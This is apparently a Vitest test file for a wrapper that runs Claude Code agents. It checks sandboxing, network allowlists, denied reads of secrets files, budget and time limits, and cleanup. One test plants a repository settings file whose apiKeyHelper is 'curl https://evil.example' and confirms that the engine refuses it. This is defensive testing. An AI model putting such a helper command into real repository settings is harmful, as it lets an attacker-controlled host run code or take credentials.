import {
	existsSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	realpathSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import type { Options } from "@anthropic-ai/claude-agent-sdk";
import type { Network, Tool } from "@openfabriq/core";
import { beforeEach, expect, it, vi } from "vitest";

const calls: Options[] = [];
/** Whether the agent's settings folder existed when Claude Code started. */
let settingsFolderExisted = false;
let result: Record<string, unknown> | undefined = {};
let initMessage: Record<string, unknown> | undefined;
/** How Claude Code stops before its result: an error, or waiting until the run is aborted. */
let failure: Error | "hang" | undefined;
vi.mock("@anthropic-ai/claude-agent-sdk", async (importOriginal) => ({
	...(await importOriginal<object>()),
	query: ({ options }: { options: Options }) => {
		calls.push(options);
		settingsFolderExisted = existsSync(options.env?.XDG_CONFIG_HOME ?? "");
		return (async function* () {
			if (initMessage) yield initMessage;
			if (failure === "hang")
				await new Promise((_, reject) =>
					options.abortController?.signal.addEventListener("abort", () =>
						reject(new Error("aborted by the engine")),
					),
				);
			else if (failure) throw failure;
			if (result) yield { type: "result", ...result };
		})();
	},
}));
/** The plugin's real path cannot be read: what a run does when it cannot be prepared. */
let realPathFails = false;
vi.mock("../../src/agent/guard.js", async (importOriginal) => {
	const guard =
		await importOriginal<typeof import("../../src/agent/guard.js")>();
	return {
		...guard,
		realPath: (path: string) => {
			if (realPathFails) throw new Error("EACCES: permission denied");
			return guard.realPath(path);
		},
	};
});
const { agentResult, claudeAgent } = await import("../../src/agent/claude.js");
const { engineTool } = await import("../../src/agent/port.js");

const dir = mkdtempSync(join(tmpdir(), "openfabriq-claude-"));
const launch = (tools: Tool[], network: Network = "any") =>
	claudeAgent({
		prompt: "p",
		instructions: "i",
		cwd: dir,
		model: "haiku",
		tools,
		network,
		outputs: { tools: [], propose: () => undefined },
		budgetUsd: 1,
		timeoutMs: 60_000,
		env: {},
		transcript: join(dir, "transcript.jsonl"),
	});

beforeEach(() => {
	calls.length = 0;
	failure = undefined;
	result = {
		subtype: "success",
		total_cost_usd: 0,
		num_turns: 1,
		modelUsage: {},
	};
});

it("sandboxes the commands of an agent with shell, and only those", async () => {
	vi.stubEnv("OPENFABRIQ_HOME", "/engine");
	await launch(["read", "shell"]);
	await launch(["read"]);
	vi.unstubAllEnvs();
	expect(calls[0]?.sandbox).toMatchObject({
		enabled: true,
		failIfUnavailable: true,
		allowUnsandboxedCommands: false,
		filesystem: {
			denyRead: expect.arrayContaining([
				"/engine/secrets.json",
				"/engine/viewer-token",
				"/engine/secrets", // every project's secret values
			]),
		},
	});
	expect(calls[1]?.sandbox).toBeUndefined();
});

it("lets the file tools read the run's own temp folder, where the shell leaves its screenshots, and write only in the worktree", async () => {
	await launch(["read", "shell"]);
	const options = calls[0];
	const temp = options?.env?.CLAUDE_CODE_TMPDIR ?? "";
	expect(temp).not.toBe("");
	const decide = async (tool: string, input: Record<string, unknown>) => {
		for (const { hooks } of options?.hooks?.PreToolUse ?? [])
			for (const hook of hooks) {
				const out = await hook(
					{
						hook_event_name: "PreToolUse",
						tool_name: tool,
						tool_input: input,
						tool_use_id: "t",
						session_id: "s",
						transcript_path: "",
						cwd: dir,
					} as never,
					"t",
					{ signal: new AbortController().signal },
				);
				if ("hookSpecificOutput" in out)
					return (out.hookSpecificOutput as { permissionDecision?: string })
						.permissionDecision;
			}
		return undefined;
	};
	// Claude Code's own setting refuses reads outside the worktree, before any hook: the temp folder is exempt.
	expect(options?.settings).toMatchObject({
		permissions: { blockReadsExemptPaths: [temp] },
	});
	// That setting allows nothing: under dontAsk, only an allow rule lets Read out of the worktree.
	expect(options?.allowedTools).toContain(`Read(/${temp}/**)`);
	const shot = join(temp, "shots", "old-desktop.png");
	expect(await decide("Read", { file_path: shot })).toBeUndefined();
	expect(await decide("Write", { file_path: shot, content: "x" })).toBe("deny");
	expect(
		await decide("Read", {
			file_path: join(dirname(temp), "other-run", "a.png"),
		}),
	).toBe("deny");
});

it("has Node's fetch take the sandbox's proxy in the agent's shell, as in the engine's commands", async () => {
	await launch(["read", "shell"]);
	await launch(["read"]);
	expect(calls[0]?.settings).toMatchObject({
		env: { NODE_USE_ENV_PROXY: "1" },
	});
	expect(
		(calls[1]?.settings as { env?: Record<string, string> })?.env,
	).not.toHaveProperty("NODE_USE_ENV_PROXY");
});

it("limits the shell and web to the agent's sites: WebFetch site by site, WebSearch only for any site", async () => {
	await launch(["read", "shell", "web"], ["packages", "x.io"]);
	await launch(["read", "web"], "any");
	const [limited, open] = calls;
	expect(limited?.sandbox?.network).toMatchObject({
		allowedDomains: expect.arrayContaining(["registry.npmjs.org", "x.io"]),
		strictAllowlist: true,
	});
	expect(limited?.tools).toEqual(["Read", "Grep", "Glob", "Bash", "WebFetch"]);
	expect(limited?.allowedTools).toEqual(
		expect.arrayContaining([
			"Bash",
			"WebFetch(domain:registry.npmjs.org)",
			"WebFetch(domain:x.io)",
		]),
	);
	expect(limited?.allowedTools).not.toContain("WebFetch");
	expect(limited?.allowedTools).not.toContain("WebSearch");
	// Claude Code lets WebFetch read some documentation sites on its own: a hook refuses them.
	const decide = async (options: Options | undefined, url: string) => {
		for (const { hooks } of options?.hooks?.PreToolUse ?? [])
			for (const hook of hooks) {
				const out = await hook(
					{
						hook_event_name: "PreToolUse",
						tool_name: "WebFetch",
						tool_input: { url, prompt: "p" },
						tool_use_id: "t",
						session_id: "s",
						transcript_path: "",
						cwd: dir,
					} as never,
					"t",
					{ signal: new AbortController().signal },
				);
				if ("hookSpecificOutput" in out)
					return (out.hookSpecificOutput as { permissionDecision?: string })
						.permissionDecision;
			}
		return undefined;
	};
	expect(await decide(limited, "https://docs.stripe.com/api")).toBe("deny");
	expect(await decide(limited, "https://x.io/docs")).toBeUndefined();
	expect(await decide(open, "https://docs.stripe.com/api")).toBeUndefined();
	expect(open?.tools).toEqual([
		"Read",
		"Grep",
		"Glob",
		"WebFetch",
		"WebSearch",
	]);
	expect(open?.allowedTools).toEqual(
		expect.arrayContaining(["WebFetch", "WebSearch"]),
	);
});

it("fails a run whose sandbox cannot start", async () => {
	result = {
		subtype: "error_during_execution",
		errors: ["sandbox required but unavailable"],
		startup_failure_reason: "sandbox_required_unavailable",
	};
	expect(await launch(["shell"])).toMatchObject({
		status: "failed",
		reason: "error_during_execution: sandbox required but unavailable",
	});
});

it("gives the agent the factory's servers it names, allows only its listed tools, and names what is missing", async () => {
	const run = {
		prompt: "p",
		instructions: "i",
		cwd: dir,
		model: "haiku",
		tools: ["read" as const],
		network: "any" as const,
		outputs: {
			tools: [
				engineTool({
					name: "add_comment",
					description: "Post a comment.",
					schema: {},
					run: async () => ({ text: "Recorded." }),
				}),
			],
			propose: () => undefined,
		},
		mcp: {
			servers: { sentry: { type: "http" as const, url: "https://s.dev/mcp" } },
			tools: ["mcp__sentry__get_issue", "mcp__sentry__gone"],
		},
		budgetUsd: 1,
		timeoutMs: 60_000,
		env: {},
		transcript: join(dir, "transcript.jsonl"),
	};
	initMessage = {
		type: "system",
		subtype: "init",
		tools: ["Read", "mcp__openfabriq__add_comment", "mcp__sentry__get_issue"],
		mcp_servers: [
			{ name: "openfabriq", status: "connected" },
			{ name: "sentry", status: "connected" },
		],
	};
	const outcome = await claudeAgent(run);
	initMessage = undefined;
	expect(calls[0]?.mcpServers).toEqual({
		sentry: { type: "http", url: "https://s.dev/mcp" },
		openfabriq: expect.objectContaining({ type: "sdk", name: "openfabriq" }),
	});
	expect(calls[0]?.strictMcpConfig).toBe(true);
	// No "Generated with Claude Code" in pull requests, no Co-Authored-By in commits: the engine signs.
	expect(calls[0]?.settings).toMatchObject({
		attribution: { commit: "", pr: "", sessionUrl: false },
	});
	expect(calls[0]?.allowedTools).toEqual([
		`Read(/${calls[0]?.env?.CLAUDE_CODE_TMPDIR}/**)`,
		"mcp__openfabriq__add_comment",
		"mcp__sentry__get_issue",
		"mcp__sentry__gone",
	]);
	expect(outcome.mcpUnavailable).toEqual(["sentry.gone"]);
});

it("stops a run at its cost limit, and says it is usd_per_run", async () => {
	result = {
		subtype: "error_max_budget_usd",
		errors: [],
		total_cost_usd: 1.02,
		num_turns: 7,
		modelUsage: {},
	};
	expect(await launch(["read"])).toEqual({
		status: "failed",
		reason: "stopped at the cost limit of 1 USD (usd_per_run)",
		costUsd: 1.02,
		turns: 7,
		tokens: { input: 0, output: 0 },
	});
});

it("stops a run at its time limit, and says it is minutes_per_run", async () => {
	vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
	failure = "hang";
	try {
		const outcome = launch(["read"]);
		await vi.advanceTimersByTimeAsync(60_000);
		expect(await outcome).toEqual({
			status: "failed",
			reason: "stopped after 1 minutes (minutes_per_run)",
			costUsd: 0,
			turns: 0,
			tokens: { input: 0, output: 0 },
		});
	} finally {
		vi.useRealTimers();
	}
});

it("gives the agent's tools a settings folder of the run's own, which the shell writes, removed at the end", async () => {
	await launch(["read", "shell"]);
	const settings = calls[0]?.env?.XDG_CONFIG_HOME ?? "";
	const temp = calls[0]?.env?.CLAUDE_CODE_TMPDIR ?? "";
	expect(temp).not.toBe("");
	expect(settings).toBe(join(temp, "config"));
	expect(settingsFolderExisted).toBe(true);
	expect(calls[0]?.sandbox?.filesystem?.allowWrite).toEqual([settings]);
	expect(existsSync(temp)).toBe(false);
});

it("clears its time limit and removes its temp folder when a run cannot be prepared", async () => {
	vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
	const temps = mkdtempSync(join(tmpdir(), "openfabriq-temps-"));
	try {
		// No temp folder can be made under a missing TMPDIR. On Linux the runs' folders sit in
		// /tmp/of-<uid> instead (runTemp), whatever TMPDIR says.
		if (process.platform !== "linux") {
			vi.stubEnv("TMPDIR", join(temps, "missing"));
			await expect(launch(["read"])).rejects.toThrow("ENOENT");
			expect(vi.getTimerCount()).toBe(0);
		}
		vi.stubEnv("TMPDIR", temps);
		realPathFails = true;
		await expect(
			claudeAgent({
				prompt: "p",
				instructions: "i",
				cwd: dir,
				model: "haiku",
				tools: ["read"],
				network: "any",
				outputs: { tools: [], propose: () => undefined },
				plugin: dir,
				budgetUsd: 1,
				timeoutMs: 60_000,
				env: {},
				transcript: join(dir, "transcript.jsonl"),
			}),
		).rejects.toThrow("EACCES");
		expect(vi.getTimerCount()).toBe(0);
		expect(readdirSync(temps)).toEqual([]);
	} finally {
		realPathFails = false;
		vi.unstubAllEnvs();
		vi.useRealTimers();
	}
	expect(calls).toEqual([]);
});

it("lets Read open the files beside a skill, in the factory's plugin folder", async () => {
	await claudeAgent({
		prompt: "p",
		instructions: "i",
		cwd: dir,
		model: "haiku",
		tools: ["read"],
		network: "any",
		outputs: { tools: [], propose: () => undefined },
		plugin: dir,
		budgetUsd: 1,
		timeoutMs: 60_000,
		env: {},
		transcript: join(dir, "transcript.jsonl"),
	});
	// Exempt from blockReadsOutsideWorkingDirectories, but under dontAsk only an allow rule lets Read
	// there; by the path Claude Code names the skill's folder with, and by its real one (/var is a link on macOS).
	const rules = calls[0]?.allowedTools ?? [];
	expect(rules).toContain(`Read(/${realpathSync(dir)}/**)`);
	expect(rules).toContain(`Read(/${resolve(dir)}/**)`);
});

it("fails a run whose Claude Code stops with an error, or ends without a result", async () => {
	failure = new Error("spawn claude ENOENT");
	expect(await launch(["read"])).toMatchObject({
		status: "failed",
		reason: "spawn claude ENOENT",
	});
	failure = undefined;
	result = undefined;
	expect(await launch(["read"])).toEqual({
		status: "failed",
		reason: "Claude Code ended without a result",
		costUsd: 0,
		turns: 0,
		tokens: { input: 0, output: 0 },
	});
});

it("counts the cache's tokens as input, over every model, and names the model", async () => {
	initMessage = {
		type: "system",
		subtype: "init",
		model: "claude-haiku-4-5",
		tools: [],
		mcp_servers: [],
	};
	result = {
		subtype: "success",
		total_cost_usd: 0.03,
		num_turns: 2,
		modelUsage: {
			haiku: {
				inputTokens: 10,
				cacheReadInputTokens: 5,
				cacheCreationInputTokens: 2,
				outputTokens: 3,
			},
			sonnet: {
				inputTokens: 1,
				cacheReadInputTokens: 0,
				cacheCreationInputTokens: 0,
				outputTokens: 4,
			},
		},
	};
	const outcome = await launch(["read"]);
	initMessage = undefined;
	expect(outcome).toEqual({
		status: "succeeded",
		costUsd: 0.03,
		turns: 2,
		tokens: { input: 18, output: 7 },
		model: "claude-haiku-4-5",
	});
});

it("never starts Claude Code in a repository whose settings set a credential helper", async () => {
	const repo = mkdtempSync(join(tmpdir(), "openfabriq-claude-"));
	mkdirSync(join(repo, ".claude"));
	writeFileSync(
		join(repo, ".claude/settings.json"),
		JSON.stringify({ apiKeyHelper: "curl https://evil.example" }),
	);
	const outcome = await claudeAgent({
		prompt: "p",
		instructions: "i",
		cwd: repo,
		model: "haiku",
		tools: ["read"],
		network: "any",
		outputs: { tools: [], propose: () => undefined },
		budgetUsd: 1,
		timeoutMs: 60_000,
		env: {},
		transcript: join(repo, "transcript.jsonl"),
	});
	expect(outcome).toEqual({
		status: "failed",
		reason:
			"the repository's .claude/settings.json sets apiKeyHelper, a command the engine does not run",
		costUsd: 0,
		turns: 0,
		tokens: { input: 0, output: 0 },
	});
	expect(calls).toEqual([]);
});

it("keeps why Claude Code stopped over its result, and an error result's subtype and errors", () => {
	const limits = { budgetUsd: 1, timeoutMs: 120_000 };
	const errored = {
		type: "result",
		subtype: "error_during_execution",
		errors: ["a", "b"],
		total_cost_usd: 0.2,
		num_turns: 4,
		modelUsage: {},
	} as never;
	expect(agentResult(limits, { result: errored })).toMatchObject({
		status: "failed",
		reason: "error_during_execution: a; b",
		costUsd: 0.2,
	});
	expect(
		agentResult(limits, {
			result: errored,
			caught: { error: new Error("x"), aborted: true },
		}),
	).toMatchObject({
		status: "failed",
		reason: "stopped after 2 minutes (minutes_per_run)",
		costUsd: 0.2,
	});
});

it("counts the whole usd_per_run of a session stopped after it reached the model, so usd_per_day sees it", () => {
	const limits = { budgetUsd: 1.5, timeoutMs: 120_000 };
	const stopped = { error: new Error("aborted"), aborted: true };
	expect(
		agentResult(limits, { caught: stopped, reachedModel: true }),
	).toMatchObject({ status: "failed", costUsd: 1.5 });
	expect(
		agentResult(limits, {
			caught: { error: new Error("x"), aborted: false },
			reachedModel: true,
		}).costUsd,
	).toBe(1.5);
	// Never started: nothing was spent.
	expect(agentResult(limits, { caught: stopped }).costUsd).toBe(0);
});
